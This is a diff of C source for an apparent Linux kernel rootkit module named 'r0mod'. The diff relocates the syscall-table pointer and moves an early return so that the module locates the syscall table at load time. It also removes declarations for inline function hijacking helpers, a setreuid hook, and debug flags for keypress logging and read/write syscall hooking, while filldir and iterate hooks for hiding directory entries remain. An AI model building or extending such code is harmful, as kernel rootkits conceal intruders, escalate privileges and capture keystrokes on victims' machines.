@@ -11,6 +11,8 @@
 #define SEARCH_START    PAGE_OFFSET
 #define SEARCH_END      ULONG_MAX //PAGE_OFFSET + 0xffffffff
 
+unsigned long *sct;
+
 #if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
 static int (*proc_filldir)(void *__buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type);
 static int (*root_filldir)(void *__buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type);
@@ -41,70 +43,6 @@ static int (*root_iterate)(struct file *file, struct dir_context *);
     ret = ITERATE_FUNC(file, ctx);                  \
 }
 #endif
-
-unsigned long *sct;
-#ifndef _R0MOD_GLOBAL_H
-#   define _R0MOD_GLOBAL_H
-
-#   include <linux/module.h>
-#   include <linux/version.h>
-#   include <linux/unistd.h>
-#   include <linux/slab.h>
-#   include <linux/list.h>
-#   include <linux/fs.h>
-#   if LINUX_VERSION_CODE >= KERNEL_VERSION(2, 6, 33)
-#       include <generated/autoconf.h>
-#   else
-#       include <linux/autoconf.h>
-#   endif
-
-// Debugging definitions
-#   define __DEBUG__ 1      // General debugging statements
-#   define __DEBUG_HOOK__ 1 // Debugging of inline function hooking
-#   define __DEBUG_KEY__ 1  // Debugging of user keypresses
-#   define __DEBUG_RW__ 1   // Debugging of sys_read and sys_write hooks
-
-// Debugging definitions
-#   if __DEBUG__
-#       define DEBUG(fmt, ...) printk(fmt, ##__VA_ARGS__)
-#   else
-#       define DEBUG(fmt, ...)
-#   endif
-
-#   if __DEBUG_HOOK__
-#       define DEBUG_HOOK(fmt, ...) printk(fmt, ##__VA_ARGS__)
-#   else
-#       define DEBUG_HOOK(fmt, ...)
-#   endif
-
-#   if __DEBUG_KEY__
-#       define DEBUG_KEY(fmt, ...) printk(fmt, ##__VA_ARGS__)
-#   else
-#       define DEBUG_KEY(fmt, ...)
-#   endif
-
-#   if __DEBUG_RW__
-#       define DEBUG_RW(fmt, ...) printk(fmt, ##__VA_ARGS__)
-#   else
-#       define DEBUG_RW(fmt, ...)
-#   endif
-
-extern unsigned long *sct;
-
-#   if LINUX_VERSION_CODE >= KERNEL_VERSION(2, 6, 30)
-unsigned long get_symbol(char *name);
-#   endif
-
-char *strnstr(const char *haystack, const char *needle, size_t n);
-void *memmem(const void *haystack, size_t haystack_size, const void *needle, size_t needle_size);
-void *memstr(const void *haystack, const char *needle, size_t size);
-
-void hijack_start(void *target, void *new);
-void hijack_pause(void *target);
-void hijack_resume(void *target);
-void hijack_stop(void *target);
-
-extern asmlinkage int (*orig_setreuid)(uid_t ruid, uid_t euid);
 
 struct s_proc_args
 {
@@ -371,14 +309,14 @@ static int __init r0mod_init(void)
     DEBUG("Search Start: %lx\n", SEARCH_START);
     DEBUG("Search End:   %lx\n", SEARCH_END);
 
-    return 0;
-
     #if defined(_CONFIG_X86_64_)
     if((sct = (void *)find_sct()) == NULL)
         DEBUG("sct == NULL * 1\n");
     #else
         sct = (void *)NULL;
     #endif
+
+    return 0;
 
     if(sct == NULL && (sct = (void *)find_sct_by_addr_scan()) == NULL)
     {
